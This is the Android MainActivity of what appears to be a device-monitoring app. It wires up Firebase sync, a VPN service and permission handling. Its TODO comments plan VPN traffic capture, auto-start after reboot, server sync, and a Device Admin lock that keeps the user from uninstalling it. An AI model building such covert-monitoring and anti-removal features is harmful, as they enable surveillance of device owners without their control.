package com.vikasyadavnsit.cdc.activities;

import android.content.Intent;
import android.net.VpnService;
import android.os.Bundle;
import android.widget.ProgressBar;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import com.google.firebase.FirebaseApp;
import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.database.repository.ApplicationDataRepository;
import com.vikasyadavnsit.cdc.database.repository.DeviceDataRepository;
import com.vikasyadavnsit.cdc.dialog.MessageDialog;
import com.vikasyadavnsit.cdc.enums.ApplicationInputActions;
import com.vikasyadavnsit.cdc.fragment.AccessibilityNotificationFragment;
import com.vikasyadavnsit.cdc.fragment.SettingsFragment;
import com.vikasyadavnsit.cdc.fragment.SystemAppUsageStatisticsFragment;
import com.vikasyadavnsit.cdc.permissions.PermissionHandler;
import com.vikasyadavnsit.cdc.services.AppContext;
import com.vikasyadavnsit.cdc.services.CDCVpnService;
import com.vikasyadavnsit.cdc.utils.ActionUtils;
import com.vikasyadavnsit.cdc.utils.CommonUtil;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;
import com.vikasyadavnsit.cdc.utils.SharedPreferenceUtils;

import javax.inject.Inject;

import dagger.hilt.android.AndroidEntryPoint;

@AndroidEntryPoint
public class MainActivity extends AppCompatActivity {
    @Inject
    PermissionHandler permissionHandler;

    public static ProgressBar progressLoader;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        //Todo: block internet and capture logs (VPN)
        //Todo: turn off wifi or internet
        //Todo: Automatically start service post restart or shutdown
        //Todo: sync local permission status on server each time someone opens the application
        //Todo: Integrate Device Admin policy to have password to prevent uninstallation
        //Todo: if the user's device is not in an unlocked state (as defined by UserManager. isUserUnlocked()), then null will be returned.
        //Todo: Use SharedPreferences (or Internal Storage): for storing data for taking decision


        initaliser();
        launcher();


        CommonUtil.loadFragment(getSupportFragmentManager(), new SettingsFragment());
        // CommonUtil.loadFragment(getSupportFragmentManager(), new AccessibilityNotificationFragment());

        ActionUtils.handleButtonPress(this);


        // FileObserver does not automatically monitor subdirectories. If you need to monitor a directory and all
        // its subdirectories, you'll have to create a FileObserver for each subdirectory
        //DirectoryMonitor directoryMonitor = new DirectoryMonitor(Environment.getExternalStorageDirectory().getAbsolutePath()+"/Alarms", new LinkedHashMap<>());
        //directoryMonitor.startWatching();

        //startVpn();
        // stopVpn();
    }


    private void launcher() {
        if (SharedPreferenceUtils.isFirstLaunch(this)) {
            MessageDialog.multilineInputDialog(this, "Enter your name : ", ApplicationInputActions.FIREBASE_CREATE_USER);
        } else {
            FirebaseUtils.getAppTriggerSettingsData();
        }
    }


    private void startVpn() {
        Intent intent = VpnService.prepare(this);
        if (intent != null) {
            startActivityForResult(intent, 22);
        } else {
            onActivityResult(22, RESULT_OK, null);
        }
    }

    private void stopVpn() {
        Intent intent = new Intent(this, CDCVpnService.class);
        intent.putExtra("stop", true);
        startService(intent);
    }

    private void initaliser() {
        progressLoader = findViewById(R.id.progress_loader);
        AppContext.init(this);
        FirebaseApp.initializeApp(this);
        ApplicationDataRepository.initialize(this);
        FirebaseUtils.initialize(this);
        DeviceDataRepository.initialize(this);
    }

    // Handle Activity Result
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        ActionUtils.onActivityResult(this, requestCode, resultCode, data);
        if (requestCode == 22 && resultCode == RESULT_OK) {
            Intent intent = new Intent(this, CDCVpnService.class);
            startService(intent);
        }
    }

    // Handle permission result
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        permissionHandler.handlePermissionResult(this, requestCode, permissions, grantResults);
    }

}